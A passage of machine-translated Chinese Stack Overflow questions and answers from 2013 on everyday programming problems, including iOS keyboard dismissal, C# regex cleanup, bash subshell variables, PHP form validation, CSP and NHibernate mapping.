Reading http://pypi.python.org/simple/pywebkitgtk/
Reading http://code.google.com/p/pywebkitgtk/
Reading http://code.google.com/p/pywebkitgtk/downloads/list
Best match: pywebkitgtk 1.1.8
Downloading https://pywebkitgtk.googlecode.com/files/pywebkitgtk-1.1.8.tar.gz
Processing pywebkitgtk-1.1.8.tar.gz
error: Couldn't find a setup script in /tmp/easy_install-M9rve1/pywebkitgtk-1.1.8.tar.gz 
```

然后，我下载了这个包，发现里面真的没有安装脚本。

有没有人通过easy_install成功安装了pywebkitgtk？

谢谢！！！

# php - 从 PayPal 链接发票

> ID：14853876
> 
> 赞同：3
> 
> 时间：2013-02-13T12:44:46.027
> 
> 标签：php, paypal

是否可以在 PayPal 上将客户实际链接到个人发票？我希望将它用于我网站上的发票后端系统。

我到处寻找，实际上找不到解决方案。我以前见过它在 WHMCS 内部工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T21:41:24.900

您的意思是在 PayPal 网站上创建的发票？当然可以。只需发送一个这样的链接（显然，实际发票号码已经到位）：

[https://www.paypal.com/us/cgi-bin/?cmd=_pay-inv&id=INV-NUM-123-456-789-012](https://www.paypal.com/us/cgi-bin/?cmd=_pay-inv&id=INV-NUM-123-456-789-012)

# ios - 从模态视图返回后，使用手势识别器关闭 UISearchBar 的键盘

> ID：14853879
> 
> 赞同：2
> 
> 时间：2013-02-13T12:44:54.590
> 
> 标签：ios, uigesturerecognizer, uisearchbar, uitapgesturerecognizer

我已经在我的应用程序中实现了一个 UISearchBar。我以编程方式创建了它，并在视图控制器（不是表格视图）中使用它。它工作得很好，但我遇到的问题是使用手势识别器来关闭键盘。我希望当用户点击键盘外的屏幕时关闭键盘。

我知道有很多解决方案可以解决这个问题，但我有一个相当独特的问题，我目前无法弄清楚。我已经使用以下代码来实现这一点。

我将此行放在 ViewController 的 viewDidLoad 方法中：

```
 [self.view addGestureRecognizer:[[UITapGestureRecognizer alloc] initWithTarget:search action:@selector(resignFirstResponder)]]; 
```

此方法正常工作，但是我的视图控制器以模态方式呈现视图，因此它具有以下结构：

**ViewController** - 模态 -> **view2** -模态 - > **view3**

当视图 2 和 3 被关闭并且我回到 ViewController 时，手势识别器不再工作。尝试我找到的另一个解决方案时，我遇到了同样的问题：

```
UIGestureRecognizer* cancelGesture;

- (void) backgroundTouched:(id)sender {
    [self.view endEditing:YES];
}

#pragma mark - UISearchBarDelegate

-(void)searchBarTextDidBeginEditing:(UISearchBar *)search {
    cancelGesture = [UITapGestureRecognizer new];
    [cancelGesture addTarget:self action:@selector(backgroundTouched:)];
    [self.view addGestureRecognizer:cancelGesture];
}

-(void)searchBarTextDidEndEditing:(UISearchBar *)search {
    if (cancelGesture) {
        [self.view removeGestureRecognizer:cancelGesture];
    }
} 
```

我将这些添加到我的主 ViewController 中，开始时它再次运行良好，但是从模态视图返回后，手势不再起作用。

任何帮助将不胜感激！

**编辑1：**

因此，在测试时，我发现按下键盘上的搜索按钮时会产生类似的效果。按下搜索后，我使用以下代码关闭键盘：

```
- (void) searchBarSearchButtonClicked:(UISearchBar *)search
{
    [search resignFirstResponder];
} 
```

这里的效果相同，当我第一次启动应用程序并进行一些搜索时工作正常，但是从我的模态呈现的视图控制器返回此屏幕后，按 Enter 不再关闭键盘。

**编辑2：**

我什至尝试在 searchBarSearchButtonClicked 委托方法中添加这段代码：

```
- (void) searchBarSearchButtonClicked:(UISearchBar *)search
{
    if ([search isFirstResponder]) {
        [search resignFirstResponder];
        NSLog(@"text field was first responder");
    } else {
        [search becomeFirstResponder];
        [search resignFirstResponder];
        NSLog(@"text field was not first responder");
    }
} 
```

两次都显示文本字段是第一响应者。从模态视图返回并再次单击搜索栏后，它仍然说它是第一响应者，但它不会解散，这很奇怪。对此的任何见解都会非常有帮助，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T15:30:09.773

好的，我弄清楚了问题所在。他们的第一响应者正在辞职，但由于焦点问题，键盘并没有消失。模态视图有一个默认行为是不关闭键盘（这显然不是一个错误）。因此，从模态视图返回后，它仍然存在这种行为（辞职第一响应者但不关闭键盘）。我解决这个问题的方法是将以下代码放在两个模态视图 .m 文件中：

```
- (BOOL)disablesAutomaticKeyboardDismissal {
return NO;
} 
```

这为我解决了。然后通过使用：

```
[search resignFirstResponder]; 
```

或者

```
[self.view endEditing: YES]; 
```

键盘会很好地关闭！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T13:03:13.970

而不是添加和删除您的手势`-(void)searchBarTextDidBeginEditing:(UISearchBar *)search {`并在viewDidDisappear中`-(void)searchBarTextDidEndEditing:(UISearchBar *)search {`执行它（在此处删除）。`viewWillAppear' (add here) and`

并假设您`cancelGesture`是具有属性的`retain`属性。添加手势时，请改为执行此操作

```
UITapGestureRecognizer *gesture = [UITapGestureRecognizer new];
[gesture addTarget:self action:@selector(backgroundTouched:)];
self.cancelGesture = gesture;
[self.view addGestureRecognizer:self.cancelGesture]; 
```

并记得`cancelGesture`在`dealloc`.

# objective-c - 如果我从 textField:shouldChangeCharactersInRange:replacementString 返回 NO，是否应该触发“Editing Changed”？

> ID：14853886
> 
> 赞同：0
> 
> 时间：2013-02-13T12:45:12.503
> 
> 标签：objective-c, delegates, uitextfield, uitextfielddelegate

我正在实现 UITextFieldDelegate 的方法 textField:shouldChangeCharactersInRange:replacementString 并返回“NO”，因为我正在格式化输入的文本（作为货币）并将其保存回 UITextField 的 text 属性。

但我在与 IBAction 相关的文本字段上也有“编辑更改”事件。如果我返回 NO，则不会调用此操作。当我返回 YES 时调用它，但这最终会使我的文本字段中的所有字母加倍！

1.  这是正确的行为吗？我找不到权威人士说是这种情况。如果您可以通过指向 Apple 文档的链接来回答，那将会很有帮助。

2.  有没有办法在我的 textField:shouldChangeCharactersInRange... 方法结束时“手动”触发此事件？（我无权从我的委托的实现中访问我的 IBAction 所定义的类。）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-14T03:30:53.203

在我实现 textField:shouldChangeCharactersInRange:replacementString （在 UITextField 上的类别中声明）结束时，我需要发送：

```
[self sendActionsForControlEvents:UIControlEventEditingChanged]; 
```

这“手动”在响应者链上触发事件，否则会通过返回 NO 来抑制。

# c# - 替换为正则表达式

> ID：14853889
> 
> 赞同：8
> 
> 时间：2013-02-13T12:45:15.827
> 
> 标签：c#, regex

在我们的应用程序中，用户将数据从 MS word 输入到 asp.net textarea 控件，最后数据保存在 SQL Server 中。出于某种原因，从 SQL Server Management Studio 中查看时，很少有看起来像小方块的垃圾字符。

这会在生成 Crystal Reports 时导致错误。

我需要一个正则表达式，它将删除所有这些字符以及项目符号。唯一有效的输入是

```
A-Z, a-z , 0-9, ~ ! @ # % $ ^ & *  ( ) _ + | ` - = \ {}:">? < [ ] ; ' , . / 
```

此外，制表符空格应替换为单个空格。输入键或换行是允许的。

目前我正在使用

```
Regex.Replace(data, @"[^\u0000-\u007F]", " "); 
```

但它不会删除项目符号或制表符空格。

任何正则表达式忍者可以帮助我解决这个问题吗？提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T13:11:02.970

您可以使用两个正则表达式。首先使用带有模式`"\t|<bullet>"`（其中`<bullet>`代表项目符号的表示）的第一个，用空格 ( `" "`) 替换 TAB 和项目符号。第二个模式是一个包含有效字符列表的否定字符集，第二个是使用空字符串 ( `""`) 替换无效字符，即去除它们。由于您需要保留 CR 和 LF 字符（和空格），因此必须将这些字符添加到有效字符集中：

```
using System;
using System.Text.RegularExpressions;

static class Program
{
  public static void Main()
  {
    string pattern1 = @"\t";
    Regex regex1 = new Regex(pattern1, RegexOptions.Compiled);
    string pattern2 = @"[^A-Za-z0-9~!#$^&*()_+|`\-=\\{}:"">?<\[\];',./ \r\n]";
    Regex regex2 = new Regex(pattern2, RegexOptions.Compiled);

    string input = "ABZabz09~!#$^&*()_+|`-=\\{}:\">?<[];',./ \r\nárvíztűrő\ttükörfúrógép";
    string temp = regex1.Replace(input, " ");
    string output = regex2.Replace(temp, "");
    Console.WriteLine(input);
    Console.WriteLine(output);
    Console.ReadKey(true);
  }
} 
```

输出：

```
ABZabz09~!#$^&*()_+|`-=\{}:">?<[];',./
árvíztűrő       tükörfúrógép
ABZabz09~!#$^&*()_+|`-=\{}:">?<[];',./
rvztr tkrfrgp 
```

请注意，后面的 TAB`árvíztűrő`已替换为单个空格。

**关于子弹：**

我在 Word 中制作了一个项目符号列表并将其复制到网页的文本区域中。然后我保存了 HTML 并发现项目符号保存为 UTF-8 编码的字符[`E280A2`](http://formex.publications.europa.eu/formex-4/physspec/formex-4-character-encoding-c04.htm)。这就是我在“子弹的表示”之上所说的。您应该找出可能的项目符号字符的二进制表示并将它们添加到第一个模式中：或者将它们添加到 TAB 字符，或者将它们全部放入字符集中：

```
using System;
using System.Text;
using System.Text.RegularExpressions;

static class Program
{
  public static void Main()
  {
    byte[] bulletBytes = new byte[] { 0xE2, 0x80, 0xA2 };
    string bullet= Encoding.UTF8.GetString(bulletBytes);

    string pattern1 = @"[\t" + bullet + "]";
    Regex regex1 = new Regex(pattern1, RegexOptions.Compiled);
    string pattern2 = @"[^A-Za-z0-9~!#$^&*()_+|`\-=\\{}:"">?<\[\];',./ \r\n]";
    Regex regex2 = new Regex(pattern2, RegexOptions.Compiled);

    string input = 
      bullet + "ABZabz09~!#$^&*()_+|`-=\\{}:\">?<[];',./ \r\n" + 
      bullet + "árvíztűrő\ttükörfúrógép";
    string temp = regex1.Replace(input, " ");
    string output = regex2.Replace(temp, "");
    Console.OutputEncoding = Encoding.UTF8;
    Console.WriteLine(input);
    Console.WriteLine(output);
    Console.ReadKey(true);
  }
} 
```

输出（您应该将控制台字体更改为 Lucida Console 以查看项目符号）：

```
•ABZabz09~!#$^&*()_+|`-=\{}:">?<[];',./
•árvíztűrő      tükörfúrógép
 ABZabz09~!#$^&*()_+|`-=\{}:">?<[];',./
 rvztr tkrfrgp 
```

现在除了 TAB 之外，每行开头的项目符号也被替换为空格。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T13:15:40.403

我认为您应该诊断潜在问题，而不是说“*某种原因*”并尝试解决症状，但这不是您的问题：

你会想要这个正则表达式：

```
 [^A-Za-z0-9~!\#\$\^&\*\(\)_\+\|`\-\=\\\{\};"\>\?\<\[\]:',\.\/] 
```

要匹配任何不允许的字符，然后您需要将其替换为`String.Empty`. 然后你只想匹配：

```
\t 
```

并将其替换为`" "`.

# shell - 从数据库中检索数据并在 shell 脚本中打印值

> ID：14853892
> 
> 赞同：0
> 
> 时间：2013-02-13T12:45:20.143
> 
> 标签：shell

在 shell 脚本中，我正在从数据库中检索数据并尝试打印它，但它没有像我尝试那样打印。

我的代码是：

```
 mysql -uroot -proot -Dproject_ivr_db -rN --execute "SELECT Regular FROM 
 Fee_MSc WHERE Fee_Type='Total:'" | while read value

 x=1

 do
       echo "V,FeeRegular_$y=$value"
       let "y+=1"
 done

 echo "V,fee_msc_regular="for students on regular basis admission fee 
 including other charges is $FeeRegular_1 and semester fee is $FeeRegular_2"" 
```

输出是：

```
 V,FeeRegular_1=12590
 V,FeeRegular_2=12850

 V,fee_msc_regular=for students on regular basis admission fee including other
 charges is and semester fee is 
```

它不会在字符串输出中打印`$FeeRegular_1`和的值。`$FeeRegular_2`

如何在输出字符串中获取这些变量的值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T20:23:37.400

假设一个类似[bash](/questions/tagged/bash "显示标记为“bash”的问题")`while`的 shell，当-loop 存在时，您要创建的变量不存在。这是因为您正在管道传输结果并创建具有新环境的[子 shell](http://tldp.org/LDP/abs/html/subshells.html#SUBSHELL)，该环境不与父 shell 共享。

您可以`for`使用[流程替换](http://tldp.org/LDP/abs/html/process-sub.html)将循环重组为 - 循环。与其尝试将数字附加到变量名称的末尾，不如使用[数组](http://tldp.org/LDP/abs/html/arrays.html)。

```
#!/bin/bash
i=0
for value in $(mysql -u{$db_user} -p${db_pass} -D${db_name} -rN --execute "
    SELECT Regular FROM Fee_MSc WHERE Fee_Type='Total:' ")
do
    FeeRegular[$i]=${value}
    echo "FeeRegular[$i]=${FeeRegular[$i]}"
    let "i+=1"
done
echo "Found ${#FeeRegular[@]} fees..."
echo "For students on regular basis admission fee including other charges is
${FeeRegular[1]} and semester fee is ${FeeRegular[2]}." 
```

我还建议不要使用 root 帐户来查询数据库、增加密码强度并且*不要发布它们*。

现在...您确定要查找的结果在第 1 行和第 2 行吗？您`order by`在查询中没有指定子句。但这是一个单独的问题。

# php - 检查是否输入了必填字段

> ID：14853894
> 
> 赞同：0
> 
> 时间：2013-02-13T12:45:28.250
> 
> 标签：php, forms, select, submit

我在 php 文件中有一个表单。

该表单中有一个表，其中包含一个必需的**SELECT**元素和一个必需的**INPUT TEXT**元素。

在表格下方还有一个提交按钮。

提交可以完美地检查表单中的必填字段是否具有值，并提醒用户哪些元素需要值。

**问题：**

我希望另一个按钮基本上检查提交按钮所做的检查，即提醒我哪些必填字段需要值**但不**提交表单。

**基本上：**

单击提交按钮时会调用哪些函数，以便我可以使用检查表单是否完成的方法。

**ContactCard.php**

```
<?php
    require_once("config.php");

    //Connect to our database
    $mysqli = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);

    //Return an error if we have connection issues
    if ($mysqli->connect_error)
    {
        die('Connect Error (' . $mysqli->connect_errno . ') '. $mysqli->connect_error);
    }

    //Query the database for the results we want
    $query = $mysqli->query("SELECT field FROM `contact_fields`");

    //Create an array of objects for each returned row
    while($array[] = $query->fetch_object());

    //Remove the blank entry at end of array
    array_pop($array);

    //Print our array results
    //print_r_html($array);
?>

<?php
    //Free result set and close connection 
    $query->close();
    $mysqli->close();
?>

<html>
<head>
<title>Add a Contact</title>
<link <link rel="stylesheet" type="text/css" href="ContactCard.css">
<script>
function addOptRow()
{

    var optTable        = document.getElementById("optTable");
    var optTableRows    = optTable.rows.length;
    var newOptRow       = optTable.insertRow(optTableRows);

    //create the dropbox fields for the new row
    var optFieldNames   = document.createElement("select");
    optFieldNames.name  = "optFieldNames";
    optFieldNames.options[optFieldNames.options.length] = new Option("",null);
    "<?php foreach($array as $option) : ?>"
        optFieldNames.options[optFieldNames.options.length] = new Option("<?php echo $option->field; ?>",null); 
    "<?php endforeach; ?>"  
    var optFieldNamesCell   = newOptRow.insertCell(0);
    optFieldNamesCell.appendChild(optFieldNames);

    //create the field value for the new row
    var optFieldValue   = document.createElement("input");
    optFieldValue.type  = "text";
    optFieldValue.name  = "optFieldValue";
    optFieldValue.required  = "true";
    var optFieldValueCell   = newOptRow.insertCell(1);
    optFieldValueCell.appendChild(optFieldValue);

    //create the field remove for the new row
    var optFieldRemove  = document.createElement("input");
    optFieldRemove.type = "button";
    optFieldRemove.value    = "Remove";
    optFieldRemove.onclick  = function(){removeOptRow(this);}
    var optFieldRemoveCell  = newOptRow.insertCell(2);
    optFieldRemoveCell.appendChild(optFieldRemove);
}

function removeOptRow(removeButton)
{
    var optTable = document.getElementById("optTable");
    optTable.deleteRow(removeButton.parentNode.parentNode.rowIndex);
}

function checkAllFieldsComplete()
{
    //if(!isset( stuck here :(
}
</script>

</head>

<body>
    <h1 id="title" >Add A Contact</h1>

    <form>  
    <fieldset id="reqFields">
    <legend>Required Fields</legend>
    <table id="reqTable">
    <tr>
        <td>Company Name</td><td><input type="text" required></input></td>
    </tr>
    <tr>
        <td>Company Code</td><td><input type="text" required></input></td>
    </tr>
    </table>
    </fieldset>

    <fieldset id="optFields">
    <legend>Optional Fields</legend>
    <table id="optTable">
    <tr><th></th><th></th><th><input type="button" value="Add" onclick=addOptRow()></button></th></tr>  
    </table>
    </fieldset> 
    <input type="submit"></input>   
    </form> 

    <div id="test" name="test">
    </div>
</body>

</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:59:02.013

您可以使用脚本执行此操作。

它检查 validate 是否返回 true 或 false。

```
$('#send').click(function(e) {
    e.preventDefault();
    if (validate()) {
        $('#myForm').submit();
    }
}); 
```

此函数返回真或假。如果输入`id="field"`为空，则返回 false。

```
function validate() {
    ok = true;

    if ($('#field').val() == "") {
        $('#field').attr({
            placeholder: 'Required'
        });
        ok = false;
    }
    return ok;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:48:43.977

您可以通过多种方式首先使用表单验证`required`

```
<input type="text" required> 
```

如果未填写，您可以使用 java 脚本进行客户端验证以进行即时响应，您也会找到许多解决方案

[空输入字段的javascript验证](https://stackoverflow.com/questions/3937513/javascript-validation-for-empty-input-field)

否则你必须在服务器端做

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:48:51.330

要回答您关于“html”的问题，您可以在单击按钮时以这种方式调用 javascript：

```
<input type="submmit" onclick="java_validation_function();" /> 
```

基本上你有两种可能性：

1.  将所有内容发布到您的 PHP 并检查 POST 变量是否存在，如果不存在则返回错误页面

2.  在提交到服务器之前使用 javascript 进行检查。您可以为此使用 jquery 验证，并从 INPUT 调用 onclick 参数上的 jquery 验证。

在这里您会找到一个 jquery/validation 示例：[http ://docs.jquery.com/Plugins/Validation](http://docs.jquery.com/Plugins/Validation)

# sql - 从数据库表中选择特定的主键

> ID：14853896
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:45:33.683
> 
> 标签：sql, sql-server, performance, sql-server-2008, tsql

我正在使用 SQL Server 数据库。我有一张`products`大约有 50,000 行的表。

表中的列`products`是`id`(primary, auto increment),`title`等`price`。

我有第二个表`Top_ten_products`，其中包含列`id`（主要、自动增量）`product_id`、. 这张表记录了前十名产品的记录。

我想从`products`表中检索前十名的产品。但是由于`products`表的大小非常大，我正在寻找一种方法，可以在`products`不遍历整个 50,000 行的情况下从表中弹出特定的 id。

我怎样才能做到这一点？提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:56:39.950

我重读了你的问题，如果你的意思是你的 Top_Ten_Products 表存储前 10 个——比如最好的 10 个——那么它就更有意义了。

一种选择是使用`INNER JOIN`：

```
SELECT * 
FROM Products P
   JOIN Top_Ten_Products T ON P.Product_Id = T.Product_Id 
```

并确保您的 Product_Id 字段上有索引。

另一种选择是为 IsTopTen 的 Products 表添加一个字段，这有点。

但是，如果您要存储最近排名前 10 的产品，那么我不建议您使用 top_ten 表——在这种情况下不需要。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:52:28.020

SQL 所做的就是遍历 50,000 条记录。

```
select * 
from products 
where id in (select product_id from Top_ten_products) 
```

Top_ten_products 上的 id primary 毫无用处。
只需将 product_id 设为 PK。

# whitelist - CSP - 白名单内容位置：它是否适用于其中包含跟踪和联盟营销的网站

> ID：14853899
> 
> 赞同：4
> 
> 时间：2013-02-13T12:45:39.557
> 
> 标签：whitelist, affiliate, content-security-policy

CSP 使用可以托管内容的域白名单。

这可以与使用联盟营销的网站一起使用吗？通常在“订单已完成”页面上有一个 iframe，其中包含一个由附属合作伙伴控制的脚本。

可以将附属脚本的域列入白名单，但我无法控制脚本的作用：我很确定它会加载其他不是白名单的内容。

是否有人对附属脚本和 CSP 有好的或不好的经验？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T17:34:44.473

不幸的是，广告提供商并不总是值得信赖，由于广告空间的转售，您最终可能会展示您不直接处理的广告网络的广告，并可能在您的客户上执行恶意软件。

关于 CSP：如果你在规则上打了太多的洞，它将变得毫无用处。话虽如此，您可以做几件事，其中之一是：[将 iframe 沙箱化](http://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/)

或者，您可以只允许使用 JavaScript 安全子集的广告（此检查可以静态执行）。“安全”意味着`document`对象不会被修改等 - 即使广告网络是恶意的，客户端也应该保持不受影响。

一个有前途的例子是[ADsafe](http://www.adsafe.org/)，但还有其他选择。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-14T09:33:46.413

关于本文，您必须将加载脚本的每个来源都列入白名单。各种数据的每个来源。

[http://www.domblogger.net/Security/CSP](http://www.domblogger.net/Security/CSP)

附属脚本的东西（我到目前为止看到的）从不从 2 级以上的位置调用脚本。脚本会请求在服务器端处理数据，例如，这些请求会重定向以获取 cookie 到您的浏览器。

从技术上讲，您可以使用“不安全内联”来运行来源不明的附属产品。但这不推荐。

# asp.net - 替换方法中的输入字符串格式不正确

> ID：14853900
> 
> 赞同：1
> 
> 时间：2013-02-13T12:45:39.660
> 
> 标签：asp.net, replace, string-formatting

我想编辑一个文本，其中有一些动态字段，所以我使用替换方法将这些字段放在上下文中的特殊位置。我的问题是当我想在上下文中替换这些字段时，它给了我一个错误：输入字符串的格式不正确。错误发生在 EmailBody 中。Body 变量的内容是这样的：

```
FROM: {JournalAbbreviation} &lt; {JournalAbbreviation}@test.com&gt;<br />
SUBJECT: Review Submitted Successfully for {JournalAbbreviation}<br />
BODY:<br />
Manuscript ID:&nbsp; {ManuscriptID}<br />
Title: {Title}<br />
<br />
<br />
Dear {Prefix} {Firstname} {Middlename} {Lastname},<br />
<br />
Thank you for your review for {JournalAbbreviation}. We appreciate your time and feedback and hope to collaborate with you again in the near future.<br />
<br />
Kind regards,<br />
{FirstnameSender}, PhD<br />
Associate Editor<br />
{JournalFullName}<br />
http://{JournalAbbreviation}.test.com<br />
<br /> 
```

此代码已保存为数据库中的字符串，并用这些代码填充正文变量。

```
 Body = Body.Replace("{Prefix}", "{0}");
        Body = Body.Replace("{Firstname}", "{1}");
        Body = Body.Replace("{Middlename}", "{2}");
        Body = Body.Replace("{Lastname}", "{3}");
        Body = Body.Replace("{ManuscriptID}", "{4}");
        Body = Body.Replace("{Title}", "{5}");
        Body = Body.Replace("{JournalAbbreviation}", "{6}");
        Body = Body.Replace("{FullJournalName}", "{7}");
        Body = Body.Replace("{PrefixSender}", "{8}");
        Body = Body.Replace("{FirstnameSender}", "{9}");
        Body = Body.Replace("{MiddlenameSender}", "{10}");
        Body = Body.Replace("{LastnameSender}", "{11}");
        string **EmailBody** = String.Format(Body, Prefix, Firstname, Middlename, Lastname, ManuscriptID, Title, JournalAbbreviation, FullJournalName, PrefixSender, FirstnameSender, MiddlenameSender, LastnameSender); 
```

打印出来的是：

发件人：IEEE < IEEE@test.com> 主题：提交给 IEEE 的评论

手稿 ID：102-IEEE-2013 标题：使用双聚类方法进行文本挖掘 International Electrical Engineering

约翰史密斯博士，

已对上述手稿进行了审查。

亲切的问候，国际电气工程 [http://IEEE.test.com](http://IEEE.test.com)

任何机构可以帮助我找到问题吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:53:14.947

我在您的身体中看到您拥有`{JournalFullName}`并且您在替换的任何地方都没有更改某个数字，所以这个（和其他类似的）给出了这个错误。

为避免此错误，ether 将此参数更改为`{{JournalFullName}}`ether 确保您也将其替换，因为符号`{}`等待内部有一个数字来反映格式上的参数。

# validation - 验证用户输入 Monotouch

> ID：14853901
> 
> 赞同：0
> 
> 时间：2013-02-13T12:45:39.783
> 
> 标签：validation, xamarin.ios

我有一个 Monotouch 应用程序，它本质上是一个大型问卷，可能有 100 到 200 个文本输入、复选框、日期选择等。验证大量数据以确保输入适当的数据，根据答案等选择需要完成的部分。

是否有工具包来协助单个字段验证和验证整个数据集合（屏幕），这些数据可以与 Monotouch 一起使用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T14:15:12.237

我不知道有任何特定的工具来验证输入。您最好的选择可能是扩展 MonoTouch.Dialog 以包含具有您需要的输入验证逻辑的新单元格类型。

# .net - 我们可以在 xsd.exe 工具生成的类中控制类型名称吗

> ID：14853905
> 
> 赞同：11
> 
> 时间：2013-02-13T12:45:47.700
> 
> 标签：.net, xsd, xsd.exe, xsd2code

xsd.exe 工具为给定的 xsd 文件生成类。它遵循命名类型的模式。例如，

```
<Students>
  <Student Name="A" RollNo="1" Address="Some Address">
    <Department Id="20" Name="CSE"/>
  </Student> 
</Students>

xsd.exe /c Students.xsd 
```

生成Students.cs 文件。如果我们看到元素的类型

```
Element     Type Name
Students    Students
Student     StudentsStudent
Department  StudentsStudentDepartment 
```

如果元素是子元素，它会通过在父元素名称前加上前缀来生成类型。我们可以控制这个名字吗？我需要类型名称与元素名称相同。学生 => 学生，部门 => 部门

提前致谢

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-02-13T16:19:02.327

通常，使用 xsd.exe 时无法自定义生成的类的名称 - 与其他地方可用的机制不同，例如 JAXB 用户通过自定义 JAXB 绑定文件。

但是，对于 xsd.exe，生成的类名取决于创作风格。您所描述的内容是在创作风格符合“俄罗斯娃娃”时生成的，即如下：

```
<?xml version="1.0" encoding="utf-8"?>
<!--XML Schema generated by QTAssistant/XML Schema Refactoring (XSR) Module (http://www.paschidev.com)-->
<xsd:schema attributeFormDefault="unqualified" elementFormDefault="qualified" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <xsd:element name="Students">
    <xsd:complexType>
      <xsd:sequence>
        <xsd:element name="Student">
          <xsd:complexType>
            <xsd:sequence>
              <xsd:element name="Department">
                <xsd:complexType>
                  <xsd:attribute name="Id" type="xsd:unsignedByte" use="required" />
                  <xsd:attribute name="Name" type="xsd:string" use="required" />
                </xsd:complexType>
              </xsd:element>
            </xsd:sequence>
            <xsd:attribute name="Name" type="xsd:string" use="required" />
            <xsd:attribute name="RollNo" type="xsd:unsignedByte" use="required" />
            <xsd:attribute name="Address" type="xsd:string" use="required" />
          </xsd:complexType>
        </xsd:element>
      </xsd:sequence>
    </xsd:complexType>
  </xsd:element>
</xsd:schema> 
```

如果您将其样式更改为不同的样式（这称为威尼斯式百叶窗）：

```
<?xml version="1.0" encoding="utf-8"?>
<!--XML Schema generated by QTAssistant/XML Schema Refactoring (XSR) Module (http://www.paschidev.com)-->
<xsd:schema attributeFormDefault="unqualified" elementFormDefault="qualified" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <xsd:element name="Students" type="Students"/>
    <xsd:complexType name="Students">
        <xsd:sequence>
            <xsd:element name="Student" type="Student"/>
        </xsd:sequence>
    </xsd:complexType>
    <xsd:complexType name="Student">
        <xsd:sequence>
            <xsd:element name="Department" type="Department"/>
        </xsd:sequence>
        <xsd:attribute name="Name" type="xsd:string" use="required"/>
        <xsd:attribute name="RollNo" type="xsd:unsignedByte" use="required"/>
        <xsd:attribute name="Address" type="xsd:string" use="required"/>
    </xsd:complexType>
    <xsd:complexType name="Department">
        <xsd:attribute name="Id" type="xsd:unsignedByte" use="required"/>
        <xsd:attribute name="Name" type="xsd:string" use="required"/>
    </xsd:complexType>
</xsd:schema> 
```

您将生成这些类：

![在此处输入图像描述](../Images/d8b54171070f5da1dedf400a5eee56aa.png)

# c# - 休眠映射，级联，逆，更新，插入？

> ID：14853916
> 
> 赞同：1
> 
> 时间：2013-02-13T12:46:32.133
> 
> 标签：c#, nhibernate, nhibernate-mapping, nhibernate-cascade

我有一个 EmployeeMonth 对象，它保存计算出的员工获得的奖金和积分。在 EmployeeMonth 对象中有一个 BonusMonth 对象。BonusMonth 对象设置员工每月必须达到的间隔才能获得奖金（此对象每月设置，不应更改）。

当我通过减少重新计算奖金时，例如：88%，我调整 BonusMonth 对象间隔，然后重新计算奖金。然后将新的奖金（结果）保存在同一个 EmployeeMonth 对象中。

然后当我保存新的 EmployeeMonth 时，BonusMonth 也会被保存。

**如何配置休眠映射以便不保存 BonusMonth？我只想更新/保存重新计算的 EmployeeMonth 值。**

这就是我的映射的样子：

EmployeeMonth.cs

```
public class EmployeeMonth
{
    public virtual Guid Id { get; private set; }
    public virtual BonusMonth BonusMonth { get; set; }
    public virtual Employee Employee { get; set; }
    public virtual int WorkReductionPercent { get; set; }
    public virtual int Points { get; set; }
    public virtual decimal Bonus{ get; set; }
} 
```

BonusMonth.cs

```
public class BonusMonth
{
    public virtual int BasicPoints { get; set; }
    public virtual int ExtraPoints { get; set; }
    public virtual int MaxPoints { get; set; }

    public virtual decimal BasicBonus { get; set; }
    public virtual decimal ExtraBonus { get; set; }
    public virtual decimal MaxBonus { get; set; }
} 
```

EmployeeMonth.hbm.xml

```
<class name="EmployeeMonth">
    <id name="Id">
        <generator class="guid" />
    </id>

    <property name="WorkReductionPercent"/>
    <property name="Points"/>
    <property name="Bonus"/>

    <many-to-one name="Employee" unique-key="EpId" column="EmployeeId" cascade="none" not-null="true" insert="true" update="false" />
    <many-to-one name="BonusMonth" column="BonusMonthId" cascade="none" not-null="true" insert="true" update="false" />
</class> 
```

BonusMonth.hbm.xml

```
<class name="BonusMonth">
    <id name="Id">
        <generator class="guid" />
    </id>
    <property name="BasicPoints"/>
    <property name="ExtraPoints"/>
    <property name="MaxPoints"/>
    <property name="BasicBonus"/>
    <property name="ExtraBonus"/>
    <property name="MaxBonus"/>
</class> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:03:22.697

它与级联无关 - 这是因为 BonusMonth 实体与 NHibernate 会话相关联。我个人建议不要更改 BonusMonth 实体，除非您希望更改保留到数据库中，但是如果您坚持，您可以通过从会话中分离 BonusMonth 实体来解决此问题：

```
session.Evict(employeeMonth.BonusMonth) 
```

您仍然需要 cascade="none" 否则它只会在您保存employeeMonth 时重新附加实体。

# javascript - JVectormap 从链接设置为悬停状态

> ID：14853921
> 
> 赞同：3
> 
> 时间：2013-02-13T12:46:42.317
> 
> 标签：javascript, jquery, mouseover, jvectormap

我已经使用[JVectormap](http://jvectormap.com/)完成了一个自定义地图，并在同一页面的另一个 div 中添加了一个具有相同状态的链接列表。

```
<div id="mylinks">
    <a href="#" id="state1" >State1</a>
    <a href="#" id="state2" >State2</a>
    <a href="#" id="state3" >State3</a>
</div> 
```

当我将鼠标悬停在链接上时，我想激活地图上的悬停状态。如何从外部告诉 jvectormap 激活状态？
